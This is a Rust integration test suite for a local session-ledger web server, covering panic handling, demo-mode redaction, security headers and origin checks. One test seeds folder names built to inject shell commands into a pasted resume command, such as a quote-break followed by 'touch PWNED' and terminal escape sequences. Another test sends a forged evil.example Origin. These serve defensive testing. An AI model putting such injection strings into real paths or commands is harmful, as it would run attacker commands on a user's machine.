    let lines: Vec<String> = ["m1", "m2", "m3"]
        .iter()
        .map(|id| assistant_line("big", &ts(MIN), id, &format!("r_{id}"), "test-model", huge.clone()))
        .collect();
    seed(&env, "p", "big", "/w/a", "x", 2 * MIN, &lines);
    let addr = start(&env, cfg(""));
    let s = first_session(&addr);
    assert_eq!(s["tokens"]["input"], u64::MAX, "{s}");
    assert_eq!(s["tokens"]["total"], u64::MAX);
    let d = detail(&addr, "big");
    assert_eq!(d["tokens"]["total"], u64::MAX);
    assert_eq!(d["split"]["main"]["tokens"], u64::MAX);
}

// ---- more hardening ----

#[test]
fn a_panicking_handler_gets_a_500_and_every_worker_keeps_serving() {
    let env = Env::new();
    let addr = start(&env, cfg(""));
    // More panics than workers: each one must be contained, not cost a worker.
    for _ in 0..5 {
        let mut r = agent().get(format!("http://{addr}/api/debug/panic")).call().unwrap();
        assert_eq!(r.status().as_u16(), 500);
        assert_eq!(r.body_mut().read_to_string().unwrap(), r#"{"error":"internal error"}"#);
    }
    for _ in 0..4 {
        let status = raw_within_2s(&addr, &format!("GET /api/sessions HTTP/1.1\r\nHost: {addr}\r\nConnection: close\r\n\r\n"));
        assert_eq!(status, 200);
    }
}

#[test]
fn list_and_detail_labels_agree_across_periods() {
    let env = Env::new();
    let old = seed(&env, "p", "old", "/x/api", "x", 10 * DAY, &[]);
    set_mtime_ago(&old, 10 * DAY as u64);
    seed(&env, "p", "new", "/y/api", "x", MIN, &[]);
    let addr = start(&env, cfg(""));
    let list = get(&addr, "/api/sessions?period=7").1;
    let sessions = list["sessions"].as_array().unwrap();
    assert_eq!(sessions.len(), 1, "{list}");
    assert_eq!(sessions[0]["project"], "y/api");
    assert_eq!(detail(&addr, "new")["project"], sessions[0]["project"]);
}

#[test]
fn serve_reports_a_handler_panic_in_one_line_and_keeps_serving() {
    let env = Env::new();
    let mut child = std::process::Command::new(env!("CARGO_BIN_EXE_sled"))
        .args(["serve", "--port", "0"])
        .env("CLAUDE_CONFIG_DIR", &env.claude)
        .env("SLED_DATA_DIR", &env.data)
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .spawn()
        .unwrap();
    let mut line = String::new();
    BufReader::new(child.stdout.take().unwrap()).read_line(&mut line).unwrap();
    let url = line.trim().strip_prefix("Session ledger is running at http://").unwrap().to_string();
    let (panic_status, panic_body) = get(&url, "/api/debug/panic");
    let (after, _) = get(&url, "/api/sessions");
    let still_running = child.try_wait().unwrap().is_none();
    child.kill().unwrap();
    child.wait().unwrap();
    let mut err = String::new();
    child.stderr.take().unwrap().read_to_string(&mut err).unwrap();
    assert_eq!((panic_status, after), (500, 200));
    assert_eq!(panic_body, serde_json::json!({"error": "internal error"}));
    assert!(still_running);
    assert_eq!(err.lines().count(), 1, "stderr: {err:?}");
    assert!(err.starts_with("sled: a request handler panicked: test panic requested"), "{err:?}");
}

// ---- demo mode ----

fn demo_cfg() -> Config {
    let mut cfg = Config::default();
    cfg.demo = true;
    cfg
}

/// Two sessions in secret folders with secret text everywhere, one with a note.
fn seed_secret(env: &Env) {
    for (project, sid, cwd, n) in [("p1", "aaa", "/Users/x/secret-alpha", 1), ("p2", "bbb", "/Users/x/secret-beta", 2)] {
        let lines = vec![
            prompt_line(sid, &ts(n * 20 * MIN), cwd, "secret-branch", "secret first prompt"),
            title_line(sid, "secret title"),
            recap_line(sid, &ts(n * 19 * MIN), "secret recap"),
            msg(sid, &format!("m{n}"), "test-model", n * 18 * MIN),
            prompt_line(sid, &ts(n * 17 * MIN), cwd, "secret-branch", "secret last prompt"),
        ];
        let path = env.write_session(project, sid, &lines);
        let mut db = Db::open(&env.paths().db_file()).unwrap();
        ingest_session(&mut db, &path).unwrap();
    }
    assert!(Db::open(&env.paths().db_file()).unwrap().set_note("aaa", "secret note").unwrap());
}

#[test]
fn demo_mode_sends_no_identifying_text() {
    let env = Env::new();
    seed_secret(&env);
    let addr = start(&env, demo_cfg());
    let (status, list) = get(&addr, "/api/sessions?period=all");
    assert_eq!(status, 200);
    assert_eq!(list["demo"], true);
    assert_eq!(list["sessions"].as_array().unwrap().len(), 2);
    let (_, a) = get(&addr, "/api/sessions/aaa");
    let (_, b) = get(&addr, "/api/sessions/bbb");
    for body in [&list, &a, &b] {
        let text = body.to_string();
        assert!(!text.contains("secret"), "real text leaked: {text}");
        assert!(!text.contains("/Users/x"), "real folder leaked: {text}");
    }
    // Made-up text is in place, and the two folders stay two distinct projects.
    assert!(!a["title"].as_str().unwrap().is_empty());
    assert_eq!(a["description_kind"], "recap");
    assert!(!a["description"].as_str().unwrap().is_empty());
    assert!(!a["first_prompt"].as_str().unwrap().is_empty());
    assert!(!a["last_prompt"].as_str().unwrap().is_empty());
    assert!(!a["branch"].as_str().unwrap().is_empty());
    assert_eq!(a["note"], "");
    assert_ne!(a["project"], b["project"]);
    assert_ne!(a["title"], b["title"]);
    let dir = a["project_dir"].as_str().unwrap();
    assert_eq!(dir, format!("~/work/{}", a["project"].as_str().unwrap()));
    assert_eq!(a["resume_command"], format!("cd {dir} && claude --resume aaa"));
    assert_eq!(a["dir_exists"], true);
}

#[test]
fn demo_mode_keeps_numbers_and_agrees_between_list_and_detail() {
    let env = Env::new();
    seed_secret(&env);
    let real = start(&env, Config::default());
    let demo = start(&env, demo_cfg());
    let (_, real_a) = get(&real, "/api/sessions/aaa");
    let (_, demo_a) = get(&demo, "/api/sessions/aaa");
    assert_eq!(real_a["demo"], Value::Null);
    // "test-model" is not in the built-in price table, so its name is not shown.
    assert_eq!(real_a["models"], serde_json::json!(["test-model"]));
    assert_eq!(demo_a["models"], serde_json::json!(["custom model"]));
    for key in ["id", "tokens", "cost", "started_at", "last_active_at", "active_ms", "split"] {
        assert_eq!(real_a[key], demo_a[key], "{key} changed in demo mode");
    }
    let (_, list) = get(&demo, "/api/sessions?period=all");
    let row = list["sessions"].as_array().unwrap().iter().find(|s| s["id"] == "aaa").unwrap();
    for key in ["title", "description", "project", "project_dir", "branch"] {
        assert_eq!(row[key], demo_a[key], "{key} differs between list and detail");
    }
    let (_, real_list) = get(&real, "/api/sessions?period=all");
    assert_eq!(real_list["demo"], false);
    assert!(real_list.to_string().contains("secret title"));
}

#[test]
fn demo_mode_refuses_note_changes() {
    let env = Env::new();
    seed_secret(&env);
    let addr = start(&env, demo_cfg());
    assert_eq!(put_note(&addr, "aaa", r#"{"note":"changed"}"#), 403);
    let row = Db::open(&env.paths().db_file()).unwrap().session("aaa").unwrap().unwrap();
    assert_eq!(row.note, "secret note");
}

#[test]
fn demo_flag_is_not_read_from_the_config_file() {
    let cfg: Config = toml::from_str("demo = true\n").unwrap_or_default();
    assert!(!cfg.demo);
}

// ---- pasting safety and browser protections ----

#[test]
fn folder_with_unsafe_characters_gets_no_resume_command() {
    let env = Env::new();
    let folders = [
        ("ctrl-c", "/tmp/x\u{3}touch MARK\n"),
        ("newline", "/tmp/a\nb"),
        ("escape", "/tmp/a\u{1b}[201~b"),
        ("backslash", "/tmp/a\\'; touch PWNED #"),
        ("bidi", "/tmp/a\u{202e}b"),
        ("zero-width", "/tmp/a\u{200b}b"),
        ("tilde", "~/a\tb"),
    ];
    for (id, dir) in folders {
        seed(&env, "p", id, dir, "x", MIN, &[]);
    }
    seed(&env, "p", "fine", "/tmp/it's a (fine) folder $HOME", "x", MIN, &[]);
    let addr = start(&env, cfg(""));
    for (id, _) in folders {
        let (_, s) = get(&addr, &format!("/api/sessions/{id}"));
        assert!(s["resume_command"].is_null(), "{id}: {s}");
        assert_eq!(s["resume_blocked"], "unsafe_folder", "{id}");
    }
    let (_, s) = get(&addr, "/api/sessions/fine");
    assert!(s["resume_blocked"].is_null());
    assert_eq!(s["resume_command"], r"cd '/tmp/it'\''s a (fine) folder $HOME' && claude --resume fine");
}

#[test]
fn replies_carry_browser_protection_headers() {
    let env = Env::new();
    let addr = start(&env, cfg(""));
    for path in ["/", "/app.js", "/api/sessions", "/nope"] {
        let (_, head) = raw(&addr, &format!("GET {path} HTTP/1.1\r\nHost: {addr}\r\nConnection: close\r\n\r\n"));
        let head = head.to_ascii_lowercase();
        for want in [
            "x-content-type-options: nosniff",
            "x-frame-options: deny",
            "referrer-policy: no-referrer",
            "content-security-policy: default-src 'self'",
            "frame-ancestors 'none'",
        ] {
            assert!(head.contains(want), "{path} is missing {want}: {head}");
        }
        assert!(!head.contains("access-control-allow"), "{path}: {head}");
    }
}

#[test]
fn note_change_from_another_origin_is_refused() {
    let env = Env::new();
    seed(&env, "p", "abc", "/w/a", "x", MIN, &[]);
    let addr = start(&env, cfg(""));
    let put = |origin: &str| {
        let body = r#"{"note":"n"}"#;
        raw(&addr, &format!(
            "PUT /api/sessions/abc/note HTTP/1.1\r\nHost: {addr}\r\n{origin}Content-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
            body.len()
        )).0
    };
    assert_eq!(put("Origin: https://evil.example\r\n"), 403);
    assert_eq!(put("Origin: null\r\n"), 403);
    assert_eq!(Db::open(&env.paths().db_file()).unwrap().session("abc").unwrap().unwrap().note, "");
    assert_eq!(put(&format!("Origin: http://{addr}\r\n")), 200);
    assert_eq!(put(""), 200);
}
